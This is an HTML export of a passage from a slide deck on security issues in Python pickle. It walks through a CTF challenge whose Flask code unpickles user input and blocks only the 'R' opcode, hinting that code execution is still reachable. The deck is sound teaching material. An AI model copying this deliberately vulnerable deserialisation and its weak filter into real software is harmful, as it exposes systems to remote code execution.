<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">
<p class="fragment highlight-red visible current-fragment" data-fragment-index="0">Pickle</p>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">marshal</li>
</ul>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img class="emoji" alt=":elephant:" src="./Security Issues in Python Pickle - HackMD_files/elephant.png" data-position="112" data-size="10"> PHP
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">PHP-Serializer</li>
</ul>
</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/4/1"><span class="slide-number-a">5</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">2</span></a></div></div></section><section hidden="" aria-hidden="true" class="stack present" style="display: block;" data-slide-number="&lt;a href=&quot;#/5&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;/a&gt;"><div class="pdf-page" style="height: 727px;"><div class="slide-background present" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 314px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;1&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Pickle in CTF Challenges</h2>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">1</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 252px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN"><a href="https://train.hitctf.cn/" target="_blank" rel="noopener">Lilac Train Platform</a></h2>
<blockquote class="part" data-startline="NaN" data-endline="NaN">
<p data-position="NaN" data-size="0"><a href="https://train.hitctf.cn/" target="_blank" rel="noopener">https://train.hitctf.cn</a></p>
</blockquote>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/1"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">2</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 256px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle</a></li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle-Revenge-Back</a></li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><a href="http://web.hitctf.cn:10020/" target="_blank" rel="noopener">2018-HITB-Python-Revenge</a></li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><a href="http://web.hitctf.cn:10019/" target="_blank" rel="noopener">2019-SJTU-Pickle-Revenge</a></li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/2"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">3</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 329px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/3&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;4&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN"><a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle</a></h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/3"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">4</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 63.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/4&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;5&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/SNb3bJN.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/4"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">5</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 63.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/5&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;6&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/28qQbdW.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/5"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">6</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 314px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/6&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;7&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">pickle.loads</h2>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/6"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">7</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 159.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/7&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;8&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/lfI2zGr.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/7"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">8</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 159px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/8&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;9&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/3dspdoL.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/8"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">9</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 203px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/9&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;10&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/BGuLQDK.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/9"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">10</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 222px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/10&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;11&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/AG7d2h2.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/10"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">11</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 309.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/11&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;12&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/RSTJKHQ.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/11"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">12</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 148.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/12&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;13&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/BKT0e5z.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/12"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">13</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 312px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/13&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;14&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">if</span> <span class="hljs-string">b'R'</span> <span class="hljs-keyword">in</span> base64.b64decode(pickle_data):
    <span class="hljs-keyword">return</span> <span class="hljs-string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span>
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/13"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">14</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 283px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/14&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;15&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Why <code data-position="NaN" data-size="1">R</code> has been restricted?</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Why not other character?</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">How does python pickle works?</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/14"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">15</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 145px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/15&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;16&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN">Read The Fucking Code</h3>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/yx2HnlE.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/15"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">16</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 329px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/16&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;17&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Make the aim and obstacles clear first</h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/16"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">17</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 152px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/17&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;18&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Goal</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">correct = (
    result == Animal(
        favorite.name, 
        favorite.category
    )
)
<span class="hljs-keyword">return</span> render_template(
    <span class="hljs-string">'unpickle_result.html'</span>, 
    result=result, 
    pickle_data=pickle_data, 
    giveflag=correct
)
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/17"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">18</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 177px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/18&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;19&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">pickle_data = request.form.get(<span class="hljs-string">'data'</span>)
<span class="hljs-comment"># Restriction 1</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">b'R'</span> <span class="hljs-keyword">in</span> base64.b64decode(pickle_data):
    <span class="hljs-keyword">return</span> <span class="hljs-string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span>
<span class="hljs-keyword">else</span>:
    result = pickle.loads(base64.b64decode(pickle_data))
    <span class="hljs-comment"># Restriction 2</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(result) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> Animal:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'Are you sure that is an animal???'</span>
<span class="hljs-comment"># Restriction 3 &amp; 4</span>
correct = (result == Animal(favorite.name, favorite.category))
<span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'unpickle_result.html'</span>, result=result, pickle_data=pickle_data, giveflag=correct)
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/18"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">19</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 167px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/19&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;20&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Restrictions</h4>
<ol class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">no more <code data-position="NaN" data-size="3">'R'</code> (REDUCE) opcode
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">No function calls</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Really?</li>
</ul>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">result unpickled is an Animal instants</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><a href="http://result.name/" target="_blank" rel="noopener">result.name</a> = <a href="http://favorite.name/" target="_blank" rel="noopener">favorite.name</a></li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">result.category = favorite.category</li>
</ol>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/19"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">20</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 329px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/20&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;21&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">What the heck can we guess name and category?</h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/20"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">21</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 292px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/21&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;22&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Brute Forcing?</h4>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/blurst_of_times.png" alt="" class="" data-position="NaN" data-size="72"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/21"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">22</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 292px; width: 960px;" data-slide-number="&lt;a href=&quot;#/5/22&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;23&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">No RCE? No function calls?</h4>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Really?</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/5/22"><span class="slide-number-a">6</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">23</span></a></div></div></section><section hidden="" aria-hidden="true" class="stack present" style="display: block;" data-slide-number="&lt;a href=&quot;#/6&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;/a&gt;"><div class="pdf-page" style="height: 727px;"><div class="slide-background present" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 321.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;1&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN">Implementation of Python pickle</h3>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">1</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 330.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img class="emoji" alt=":grinning:" src="./Security Issues in Python Pickle - HackMD_files/grinning.png" data-position="3" data-size="10"> <a href="https://github.com/python/cpython/blob/master/Lib/pickle.py" target="_blank" rel="noopener">Python</a></li>
</ul>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img class="emoji" alt=":frowning:" src="./Security Issues in Python Pickle - HackMD_files/frowning.png" data-position="86" data-size="10"> <a href="https://github.com/python/cpython/blob/master/Modules/_pickle.c" target="_blank" rel="noopener">C</a></li>
</ul>
